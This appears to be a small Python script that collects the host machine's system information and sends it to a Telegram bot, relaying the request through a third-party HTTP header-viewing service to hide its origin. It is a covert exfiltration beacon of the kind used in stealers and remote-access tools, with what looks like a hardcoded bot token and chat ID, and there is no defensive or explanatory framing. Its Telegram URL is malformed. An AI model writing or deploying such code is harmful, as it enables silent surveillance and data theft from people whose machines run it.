# z
import os
import requests
import platform

a = platform.uname()

url = ("https://api.telegram.org/1454173013:AAFjPy4Vfwhg_dLtxNyAacpxz8Rbuqua3Oc/sendmessage?chat_id=925528279text=" + str(a))
payload = {"Ur Box" : url,
    "AgentList" : "Mozilla Firefox",
    "VersionList" : "HTTP/1.1",
    "MethodList" : "POST"
}

req = requests.post("https://www.httpdebugger.com/tools/ViewHeaders.aspx" , payload)
print(req)
